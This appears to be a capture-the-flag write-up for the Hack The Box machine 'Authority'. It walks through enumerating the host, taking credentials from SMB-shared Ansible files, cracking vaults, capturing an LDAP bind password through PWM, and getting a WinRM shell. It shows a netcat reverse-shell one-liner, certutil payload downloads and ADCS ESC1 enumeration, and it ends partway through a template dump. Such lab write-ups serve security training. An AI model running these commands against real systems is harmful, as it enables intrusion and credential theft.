![authority.png](authority.png)

# Authority

## Enum
```
nmap -Pn -sC -sV 10.10.11.222 -oN scans/nmap.initial
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-23 13:06 IST
Nmap scan report for 10.10.11.222
Host is up (0.031s latency).
Not shown: 989 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-07-23 16:06:53Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
|_ssl-date: 2023-07-23T16:07:18+00:00; +4h00m00s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
|_ssl-date: 2023-07-23T16:07:17+00:00; +4h00m01s from scanner time.
8443/tcp open  ssl/https-alt
|_ssl-date: TLS randomness does not represent time
|_http-title: Site doesn't have a title (text/html;charset=ISO-8859-1).
| fingerprint-strings:
|   FourOhFourRequest, GetRequest:
|     HTTP/1.1 200
|     Content-Type: text/html;charset=ISO-8859-1
|     Content-Length: 82
|     Date: Sun, 23 Jul 2023 16:06:59 GMT
|     Connection: close
|     <html><head><meta http-equiv="refresh" content="0;URL='/pwm'"/></head></html>
|   HTTPOptions:
|     HTTP/1.1 200
|     Allow: GET, HEAD, POST, OPTIONS
|     Content-Length: 0
|     Date: Sun, 23 Jul 2023 16:06:59 GMT
|     Connection: close
|   RTSPRequest:
|     HTTP/1.1 400
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 1936
|     Date: Sun, 23 Jul 2023 16:07:05 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400
|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400
|_    Request</h1><hr class="line" /><p><b>Type</b> Exception Report</p><p><b>Message</b> Invalid character found in the HTTP protocol [RTSP&#47;1.00x0d0x0a0x0d0x0a...]</p><p><b>Description</b> The server cannot or will not process the request due to something that is perceived to be a client error (e.g., malformed request syntax, invalid
| ssl-cert: Subject: commonName=172.16.2.118
| Not valid before: 2023-07-21T10:43:31
|_Not valid after:  2025-07-22T22:21:55
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8443-TCP:V=7.94%T=SSL%I=7%D=7/23%Time=64BD17E3%P=aarch64-unknown-li
SF:nux-gnu%r(GetRequest,DB,"HTTP/1\.1\x20200\x20\r\nContent-Type:\x20text/
SF:html;charset=ISO-8859-1\r\nContent-Length:\x2082\r\nDate:\x20Sun,\x2023
SF:\x20Jul\x202023\x2016:06:59\x20GMT\r\nConnection:\x20close\r\n\r\n\n\n\
SF:n\n\n<html><head><meta\x20http-equiv=\"refresh\"\x20content=\"0;URL='/p
SF:wm'\"/></head></html>")%r(HTTPOptions,7D,"HTTP/1\.1\x20200\x20\r\nAllow
SF::\x20GET,\x20HEAD,\x20POST,\x20OPTIONS\r\nContent-Length:\x200\r\nDate:
SF:\x20Sun,\x2023\x20Jul\x202023\x2016:06:59\x20GMT\r\nConnection:\x20clos
SF:e\r\n\r\n")%r(FourOhFourRequest,DB,"HTTP/1\.1\x20200\x20\r\nContent-Typ
SF:e:\x20text/html;charset=ISO-8859-1\r\nContent-Length:\x2082\r\nDate:\x2
SF:0Sun,\x2023\x20Jul\x202023\x2016:06:59\x20GMT\r\nConnection:\x20close\r
SF:\n\r\n\n\n\n\n\n<html><head><meta\x20http-equiv=\"refresh\"\x20content=
SF:\"0;URL='/pwm'\"/></head></html>")%r(RTSPRequest,82C,"HTTP/1\.1\x20400\
SF:x20\r\nContent-Type:\x20text/html;charset=utf-8\r\nContent-Language:\x2
SF:0en\r\nContent-Length:\x201936\r\nDate:\x20Sun,\x2023\x20Jul\x202023\x2
SF:016:07:05\x20GMT\r\nConnection:\x20close\r\n\r\n<!doctype\x20html><html
SF:\x20lang=\"en\"><head><title>HTTP\x20Status\x20400\x20\xe2\x80\x93\x20B
SF:ad\x20Request</title><style\x20type=\"text/css\">body\x20{font-family:T
SF:ahoma,Arial,sans-serif;}\x20h1,\x20h2,\x20h3,\x20b\x20{color:white;back
SF:ground-color:#525D76;}\x20h1\x20{font-size:22px;}\x20h2\x20{font-size:1
SF:6px;}\x20h3\x20{font-size:14px;}\x20p\x20{font-size:12px;}\x20a\x20{col
SF:or:black;}\x20\.line\x20{height:1px;background-color:#525D76;border:non
SF:e;}</style></head><body><h1>HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Ba
SF:d\x20Request</h1><hr\x20class=\"line\"\x20/><p><b>Type</b>\x20Exception
SF:\x20Report</p><p><b>Message</b>\x20Invalid\x20character\x20found\x20in\
SF:x20the\x20HTTP\x20protocol\x20\[RTSP&#47;1\.00x0d0x0a0x0d0x0a\.\.\.\]</
SF:p><p><b>Description</b>\x20The\x20server\x20cannot\x20or\x20will\x20not
SF:\x20process\x20the\x20request\x20due\x20to\x20something\x20that\x20is\x
SF:20perceived\x20to\x20be\x20a\x20client\x20error\x20\(e\.g\.,\x20malform
SF:ed\x20request\x20syntax,\x20invalid\x20");
Service Info: Host: AUTHORITY; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2023-07-23T16:07:12
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
|_clock-skew: mean: 4h00m00s, deviation: 0s, median: 4h00m00s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.59 seconds
```

Visiting port 8443 gives us the domain name
![directory.png](directory.png)  

Fuzzing that we get more subdomains
```
ffuf \
  -c \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
  -u "http://authority.htb" \
  -H "Host: FUZZ.authority.htb" -mc all -fs 703

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://authority.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.authority.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Response size: 703
________________________________________________

[Status: 400, Size: 334, Words: 21, Lines: 7, Duration: 29ms]
    * FUZZ: #www

[Status: 400, Size: 334, Words: 21, Lines: 7, Duration: 31ms]
    * FUZZ: #mail

:: Progress: [19966/19966] :: Job [1/1] :: 1162 req/sec :: Duration: [0:00:16] :: Errors: 0 ::
```

And we can now also talk to the dns server
```bash
dig any authority.htb @10.10.11.222

; <<>> DiG 9.18.16-1-Debian <<>> any authority.htb @10.10.11.222
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 56135
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 5, AUTHORITY: 0, ADDITIONAL: 4

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;authority.htb.                 IN      ANY

;; ANSWER SECTION:
authority.htb.          600     IN      A       10.10.11.222
authority.htb.          3600    IN      NS      authority.authority.htb.
authority.htb.          3600    IN      SOA     authority.authority.htb. hostmaster.htb.corp. 174 900 600 86400 3600
authority.htb.          600     IN      AAAA    dead:beef::9e
authority.htb.          600     IN      AAAA    dead:beef::3331:9963:2a3e:8edc

;; ADDITIONAL SECTION:
authority.authority.htb. 3600   IN      A       10.10.11.222
authority.authority.htb. 3600   IN      AAAA    dead:beef::9e
authority.authority.htb. 3600   IN      AAAA    dead:beef::3331:9963:2a3e:8edc

;; Query time: 32 msec
;; SERVER: 10.10.11.222#53(10.10.11.222) (TCP)
;; WHEN: Sun Jul 23 13:26:08 IST 2023
;; MSG SIZE  rcvd: 265
```

Enumerating SMB
```bash
smbmap -H 10.10.11.222 -u guest
[+] IP: 10.10.11.222:445        Name: authority.authority.htb
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        Department Shares                                       NO ACCESS
        Development                                             READ ONLY
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share
        SYSVOL                                                  NO ACCESS       Logon server share
```
```bash
smbclient  -U Guest --password="" //10.10.11.222/Development
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Mar 17 13:20:38 2023
  ..                                  D        0  Fri Mar 17 13:20:38 2023
  Automation                          D        0  Fri Mar 17 13:20:40 2023
```
Downloading all this locally
```bash
smb: \> mask ""
smb: \> recurse
smb: \> prompt
smb: \> mget *
getting file \Automation\Ansible\ADCS\.ansible-lint of size 259 as Automation/Ansible/ADCS/.ansible-lint (2.0 KiloBytes/sec) (average 2.0 KiloBytes/sec)
getting file \Automation\Ansible\ADCS\.yamllint of size 205 as Automation/Ansible/ADCS/.yamllint (1.9 KiloBytes/sec) (average 2.0 KiloBytes/sec)
...SNIP...
```

```
pwd
/home/blnkn/sec/htb/machines/authority/loot/Automation/Ansible
```
```bash
ls -la
total 24
drwxr-xr-x  6 blnkn blnkn 4096 Jul 23 13:36 .
drwxr-xr-x  3 blnkn blnkn 4096 Jul 23 13:36 ..
drwxr-xr-x  8 blnkn blnkn 4096 Jul 23 13:36 ADCS
drwxr-xr-x 10 blnkn blnkn 4096 Jul 23 13:36 LDAP
drwxr-xr-x  7 blnkn blnkn 4096 Jul 23 13:36 PWM
drwxr-xr-x  3 blnkn blnkn 4096 Jul 23 13:36 SHARE
```
```bash
tree -a .
.
├── ADCS
│   ├── .ansible-lint
│   ├── defaults
│   │   └── main.yml
│   ├── LICENSE
│   ├── meta
│   │   ├── main.yml
│   │   └── preferences.yml
│   ├── molecule
│   │   └── default
│   │       ├── converge.yml
│   │       ├── molecule.yml
│   │       └── prepare.yml
│   ├── README.md
│   ├── requirements.txt
│   ├── requirements.yml
│   ├── SECURITY.md
│   ├── tasks
│   │   ├── assert.yml
│   │   ├── generate_ca_certs.yml
│   │   ├── init_ca.yml
│   │   ├── main.yml
│   │   └── requests.yml
│   ├── templates
│   │   ├── extensions.cnf.j2
│   │   └── openssl.cnf.j2
│   ├── tox.ini
│   ├── vars
│   │   └── main.yml
│   └── .yamllint
├── LDAP
│   ├── .bin
│   │   ├── clean_vault
│   │   ├── diff_vault
│   │   └── smudge_vault
│   ├── defaults
│   │   └── main.yml
│   ├── files
│   │   └── pam_mkhomedir
│   ├── handlers
│   │   └── main.yml
│   ├── meta
│   │   └── main.yml
│   ├── README.md
│   ├── tasks
│   │   └── main.yml
│   ├── templates
│   │   ├── ldap_sudo_groups.j2
│   │   ├── ldap_sudo_users.j2
│   │   ├── sssd.conf.j2
│   │   └── sudo_group.j2
│   ├── TODO.md
│   ├── .travis.yml
│   ├── Vagrantfile
│   └── vars
│       ├── debian.yml
│       ├── main.yml
│       ├── redhat.yml
│       └── ubuntu-14.04.yml
├── PWM
│   ├── ansible.cfg
│   ├── ansible_inventory
│   ├── defaults
│   │   └── main.yml
│   ├── handlers
│   │   └── main.yml
│   ├── meta
│   │   └── main.yml
│   ├── README.md
│   ├── tasks
│   │   └── main.yml
│   └── templates
│       ├── context.xml.j2
│       └── tomcat-users.xml.j2
└── SHARE
    └── tasks
        └── main.yml

26 directories, 52 files
```

Grepping around to find interesting things  

In ADCS
```yaml
# A passphrase for the CA key.
ca_passphrase: SuP3rS3creT
```

In PWM
```yaml
ansible_user: administrator
ansible_password: Welcome1
ansible_port: 5985
ansible_connection: winrm
ansible_winrm_transport: ntlm
ansible_winrm_server_cert_validation: ignore
```
```yaml
---
pwm_run_dir: "{{ lookup('env', 'PWD') }}"

pwm_hostname: authority.htb.corp
pwm_http_port: "{{ http_port }}"
pwm_https_port: "{{ https_port }}"
pwm_https_enable: true

pwm_require_ssl: false

pwm_admin_login: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          32666534386435366537653136663731633138616264323230383566333966346662313161326239
          6134353663663462373265633832356663356239383039640a346431373431666433343434366139
          35653634376333666234613466396534343030656165396464323564373334616262613439343033
          6334326263326364380a653034313733326639323433626130343834663538326439636232306531
          3438

pwm_admin_password: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          31356338343963323063373435363261323563393235633365356134616261666433393263373736
          3335616263326464633832376261306131303337653964350a363663623132353136346631396662
          38656432323830393339336231373637303535613636646561653637386634613862316638353530
          3930356637306461350a316466663037303037653761323565343338653934646533663365363035
          6531

ldap_uri: ldap://127.0.0.1/
ldap_base_dn: "DC=authority,DC=htb"
ldap_admin_password: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          63303831303534303266356462373731393561313363313038376166336536666232626461653630
          3437333035366235613437373733316635313530326639330a643034623530623439616136363563
          34646237336164356438383034623462323531316333623135383134656263663266653938333334
          3238343230333633350a646664396565633037333431626163306531336336326665316430613566
          3764
```
```xml
<?xml version='1.0' encoding='cp1252'?>

<tomcat-users xmlns="http://tomcat.apache.org/xml" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
 xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
 version="1.0">

<user username="admin" password="T0mc@tAdm1n" roles="manager-gui"/>
<user username="robot" password="T0mc@tR00t" roles="manager-script"/>

</tomcat-users>
```

```bash
./ldapsearch-ad.py -l 10.10.11.222 -t info
### Server infos ###
[+] Forest functionality level = Windows 2016
[+] Domain functionality level = Windows 2016
[+] Domain controller functionality level = Windows 2016
[+] rootDomainNamingContext = DC=authority,DC=htb
[+] defaultNamingContext = DC=authority,DC=htb
[+] ldapServiceName = authority.htb:authority$@AUTHORITY.HTB
[+] naming_contexts = ['DC=authority,DC=htb', 'CN=Configuration,DC=authority,DC=htb', 'CN=Schema,CN=Configuration,DC=authority,DC=htb', 'DC=DomainDnsZones,DC=authority,DC=htb', 'DC=ForestDnsZones,DC=authority,DC=htb']
```
[https://docs.travis-ci.com/user/environment-variables/#encrypting-environment-variables](https://docs.travis-ci.com/user/environment-variables/#encrypting-environment-variables)  


## Cracking Ansible Vault secrets
The password for the vaults seems to be stored in an env variable which is encrypted with travis-ci, I don't know if it is really possible to crack that, but we can attempt to crack the vaults directly
```bash
/usr/share/john/ansible2john.py vault.yaml > vault.in
```
```bash
hashcat -a0 vault.in /usr/share/wordlists/rockyou.txt
```
```bash
ansible-vault decrypt vault.yml --vault-password-file pass
```

## Exploiting PWM

With one of those we can connect to the PWM instance on 8443  

PWM version: 
```
v2.0.3 bc96802e
```

Confirming some existing users and their exact ldap bind domain from somewhere in the configuration app
```
CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb 
CN=Administrator,CN=Users,DC=authority,DC=htb
CN=Guest,CN=Users,DC=authority,DC=htb
CN=krbtgt,CN=Users,DC=authority,DC=htb
```

Troubleshooting this thing in editor mode to connect it to the ldap instance:  
It won't connect to authority.htb because that isn't one of the DNS names in the SAN section of the cert  
```bash
echo |openssl s_client -connect htb.corp:636 -showcerts
openssl x509 -in ldap-cert.pem -noout -text |grep Alternative -A1
            X509v3 Subject Alternative Name: critical
                othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
```

`htb.corp` is though so if we point it there and import the cert from the server in the PWM client, we get a working connection to the ldap server.
![ldap.png](ldap.png)  

This means it has a valid user:password to connect to ldap, and since we can control where to point it to, we can just point it to ourselves:  
![intercept.png](intercept.png)  

Setup a basic listener and hit the `Test Ldap Profile` button to get the password
```bash
nc -lvnp 636
listening on [any] 636 ...
connect to [10.10.14.218] from (UNKNOWN) [10.10.11.222] 62853
0Y`T;CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb************cle4r!
```

## BloodHound

Leveraging bloodhound.py to dump data from the ldap domain from outside. Just for the exercise 
```bash
./bloodhound.py -d authority.htb -ns 10.10.11.222 -u svc_ldap@authority.htb -p 'lD****************'
INFO: Found AD domain: authority.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Connecting to LDAP server: authority.authority.htb
WARNING: LDAP Authentication is refused because LDAP signing is enabled. Trying to connect over LDAPS instead...
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Found 5 users
INFO: Connecting to LDAP server: authority.authority.htb
WARNING: LDAP Authentication is refused because LDAP signing is enabled. Trying to connect over LDAPS instead...
INFO: Found 52 groups
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: authority.authority.htb
INFO: Done in 00M 10S
```
```bash
sudo neo4j start
Directories in use:
home:         /usr/share/neo4j
config:       /usr/share/neo4j/conf
logs:         /usr/share/neo4j/logs
plugins:      /usr/share/neo4j/plugins
import:       /usr/share/neo4j
data:         /usr/share/neo4j/data
certificates: /usr/share/neo4j/certificates
licenses:     /usr/share/neo4j/licenses
run:          /usr/share/neo4j/run
Starting Neo4j.
Started neo4j (pid:6463). It is available at http://localhost:7474
There may be a short delay until the server is ready.
```
```bash
bloodhound &
[1] 7235
```

Adding the passwords we got to our know users / passwords lists and tryng some winrm bruteforce with crackmapexec
```bash
cme winrm 10.10.11.222 -d authority.htb -u users.txt -p passwords.txt
HTTP        10.10.11.222    5985   10.10.11.222     [*] http://10.10.11.222:5985/wsman
WINRM       10.10.11.222    5985   10.10.11.222     [-] authority.htb\svc_ldap:Su*********
WINRM       10.10.11.222    5985   10.10.11.222     [-] authority.htb\svc_ldap:T0********
WINRM       10.10.11.222    5985   10.10.11.222     [-] authority.htb\svc_ldap:T0*********
WINRM       10.10.11.222    5985   10.10.11.222     [-] authority.htb\svc_ldap:We******
WINRM       10.10.11.222    5985   10.10.11.222     [-] authority.htb\svc_ldap:De*********
WINRM       10.10.11.222    5985   10.10.11.222     [-] authority.htb\svc_ldap:pW***********
WINRM       10.10.11.222    5985   10.10.11.222     [+] authority.htb\svc_ldap:lD**************** (Pwn3d!)
```

So we now have a valid pair of creds to connect to ldap, but also to winrm
```bash
evil-winrm -i authority.htb -u svc_ldap -p 'lD****************'

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_ldap\Documents>
```

## Privesc

```bash
*Evil-WinRM* PS C:\users\svc_ldap\Documents> certutil.exe -urlcache -f http://10.10.14.218:9090/winpeas.exe winpeas.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.
```
```bash
*Evil-WinRM* PS C:\users\svc_ldap\Documents> cmdkey /list

Currently stored credentials:

* NONE *
```

Sidenote, here's how to make a netcat callback from the powershell evil-winrm shell to get a cmd shell
```bash
cmd.exe /c "nc64.exe 10.10.14.218 4242 -e cmd.exe"
```

Certs folder
```bash
*Evil-WinRM* PS C:\Certs> dir


    Directory: C:\Certs


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         8/5/2023  11:39 AM           3473 cert.pfx
-a----        4/23/2023   6:11 PM           4933 LDAPs.pfx
-a----         8/5/2023   1:01 PM          45272 nc64.exe
-a----         8/4/2023   1:12 PM         446976 Rubeus.exe

```

## Exploiting CVE-2022–26923 by Abusing Active Directory Certificate Services (ADCS)

[https://systemweakness.com/exploiting-cve-2022-26923-by-abusing-active-directory-certificate-services-adcs-a511023e5366](https://systemweakness.com/exploiting-cve-2022-26923-by-abusing-active-directory-certificate-services-adcs-a511023e5366)  
[https://tryhackme.com/room/cve202226923)](https://tryhackme.com/room/cve202226923)  

See available templates with the built in windows tools, we could grep through those 37 templates manually to find if any of those are vulnerable.
```bash
*Evil-WinRM* PS C:\Users\svc_ldap\Documents> certutil -v -template|select-string Template\[

  Template[0]:
  Template[1]:
  Template[2]:
  Template[3]:
  Template[4]:
  Template[5]:
  Template[6]:
  Template[7]:
  Template[8]:
  Template[9]:
  Template[10]:
  Template[11]:
  Template[12]:
  Template[13]:
  Template[14]:
  Template[15]:
  Template[16]:
  Template[17]:
  Template[18]:
  Template[19]:
  Template[20]:
  Template[21]:
  Template[22]:
  Template[23]:
  Template[24]:
  Template[25]:
  Template[26]:
  Template[27]:
  Template[28]:
  Template[29]:
  Template[30]:
  Template[31]:
  Template[32]:
  Template[33]:
  Template[34]:
  Template[35]:
  Template[36]:
```

Or we could take the lazy route and automate the process with Certify.exe from Ghostpack
```
*Evil-WinRM* PS C:\Certs> ./Certify.exe find /vulnerable

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.0.0

[*] Action: Find certificate templates
[*] Using the search base 'CN=Configuration,DC=authority,DC=htb'

[*] Listing info about the Enterprise CA 'AUTHORITY-CA'

    Enterprise CA Name            : AUTHORITY-CA
    DNS Hostname                  : authority.authority.htb
    FullName                      : authority.authority.htb\AUTHORITY-CA
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=AUTHORITY-CA, DC=authority, DC=htb
    Cert Thumbprint               : 42A80DC79DD9CE76D032080B2F8B172BC29B0182
    Cert Serial                   : 2C4E1F3CA46BBDAF42A1DDE3EC33A6B4
    Cert Start Date               : 4/23/2023 9:46:26 PM
    Cert End Date                 : 4/23/2123 9:56:25 PM
    Cert Chain                    : CN=AUTHORITY-CA,DC=authority,DC=htb
    UserSpecifiedSAN              : Disabled
    CA Permissions                :
      Owner: BUILTIN\Administrators        S-1-5-32-544

      Access Rights                                     Principal

      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
      Allow  ManageCA, ManageCertificates               HTB\Domain Admins             S-1-5-21-622327497-3269355298-2248959698-512
      Allow  ManageCA, ManageCertificates               HTB\Enterprise Admins         S-1-5-21-622327497-3269355298-2248959698-519
    Enrollment Agent Restrictions : None

[!] Vulnerable Certificates Templates :

    CA Name                               : authority.authority.htb\AUTHORITY-CA
    Template Name                         : CorpVPN
    Schema Version                        : 2
    Validity Period                       : 20 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT_CHECK_USER_DS_CERTIFICATE
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Document Signing, Encrypting File System, IP security IKE intermediate, IP security user, KDC Authentication, Secure Email
    mspki-certificate-application-policy  : Client Authentication, Document Signing, Encrypting File System, IP security IKE intermediate, IP security user, KDC Authentication, Secure Email
    Permissions
      Enrollment Permissions
        Enrollment Rights           : HTB\Domain Admins             S-1-5-21-622327497-3269355298-2248959698-512
                                      HTB\Domain Computers          S-1-5-21-622327497-3269355298-2248959698-515
                                      HTB\Enterprise Admins         S-1-5-21-622327497-3269355298-2248959698-519
      Object Control Permissions
        Owner                       : HTB\Administrator             S-1-5-21-622327497-3269355298-2248959698-500
        WriteOwner Principals       : HTB\Administrator             S-1-5-21-622327497-3269355298-2248959698-500
                                      HTB\Domain Admins             S-1-5-21-622327497-3269355298-2248959698-512
                                      HTB\Enterprise Admins         S-1-5-21-622327497-3269355298-2248959698-519
        WriteDacl Principals        : HTB\Administrator             S-1-5-21-622327497-3269355298-2248959698-500
                                      HTB\Domain Admins             S-1-5-21-622327497-3269355298-2248959698-512
                                      HTB\Enterprise Admins         S-1-5-21-622327497-3269355298-2248959698-519
        WriteProperty Principals    : HTB\Administrator             S-1-5-21-622327497-3269355298-2248959698-500
                                      HTB\Domain Admins             S-1-5-21-622327497-3269355298-2248959698-512
                                      HTB\Enterprise Admins         S-1-5-21-622327497-3269355298-2248959698-519



Certify completed in 00:00:10.2922857
```

Certify.exe is cool but is not pointing out the exact reasons why this is vulnerable for dummies like me, so we can do the same thing remotely with certipy
```bash
certipy find -u svc_ldap@authority.htb -p 'lD****************' -dc-ip 10.10.11.222

Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 37 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 13 enabled certificate templates
[*] Trying to get CA configuration for 'AUTHORITY-CA' via CSRA
[!] Got error while trying to get CA configuration for 'AUTHORITY-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'AUTHORITY-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Got CA configuration for 'AUTHORITY-CA'
[*] Saved BloodHound data to '20230805150934_Certipy.zip'. Drag and drop the file into the BloodHound GUI from @ly4k
[*] Saved text output to '20230805150934_Certipy.txt'
[*] Saved JSON output to '20230805150934_Certipy.json'
```

Certipy results
```bash
1
    Template Name                       : CorpVPN
    Display Name                        : Corp VPN
    Certificate Authorities             : AUTHORITY-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : AutoEnrollmentCheckUserDsCertificate
                                          PublishToDs
                                          IncludeSymmetricAlgorithms
    Private Key Flag                    : 16777216
                                          65536
                                          ExportableKey
    Extended Key Usage                  : Encrypting File System
                                          Secure Email
                                          Client Authentication
                                          Document Signing
                                          IP security IKE intermediate
                                          IP security use
                                          KDC Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 20 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : AUTHORITY.HTB\Domain Computers
                                          AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : AUTHORITY.HTB\Administrator
        Write Owner Principals          : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
                                          AUTHORITY.HTB\Administrator
        Write Dacl Principals           : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
                                          AUTHORITY.HTB\Administrator
        Write Property Principals       : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
                                          AUTHORITY.HTB\Administrator
    [!] Vulnerabilities
      ESC1                              : 'AUTHORITY.HTB\\Domain Computers' can enroll, enrollee supplies subject and template allows client authentication
```

Certipy is already telling us that the `CorpVPN` template is vulnerable and why, manually enumerating the template anyway
```bash
  Template[8]:
  TemplatePropCommonName = CorpVPN
  TemplatePropFriendlyName = Corp VPN
  TemplatePropEKUs =
7 ObjectIds:
    1.3.6.1.4.1.311.10.3.4 Encrypting File System
    1.3.6.1.5.5.7.3.4 Secure Email
    1.3.6.1.5.5.7.3.2 Client Authentication
    1.3.6.1.4.1.311.10.3.12 Document Signing
    1.3.6.1.5.5.8.2.2 IP security IKE intermediate
    1.3.6.1.5.5.7.3.7 IP security user
    1.3.6.1.5.2.3.5 KDC Authentication

  TemplatePropCryptoProviders =
    0: Microsoft Enhanced Cryptographic Provider v1.0
    1: Microsoft Base Cryptographic Provider v1.0

  TemplatePropMajorRevision = 64 (100)
  TemplatePropDescription = User
  TemplatePropSchemaVersion = 2
  TemplatePropMinorRevision = 8
  TemplatePropRASignatureCount = 0
  TemplatePropMinimumKeySize = 800 (2048)
  TemplatePropOID =
    1.3.6.1.4.1.311.21.8.9199372.15294569.5129608.13980871.2433934.254.5580598.4156950 Corp VPN

  TemplatePropV1ApplicationPolicy =
7 ObjectIds:
    1.3.6.1.4.1.311.10.3.4 Encrypting File System
    1.3.6.1.5.5.7.3.4 Secure Email
    1.3.6.1.5.5.7.3.2 Client Authentication
    1.3.6.1.4.1.311.10.3.12 Document Signing
    1.3.6.1.5.5.8.2.2 IP security IKE intermediate
    1.3.6.1.5.5.7.3.7 IP security user
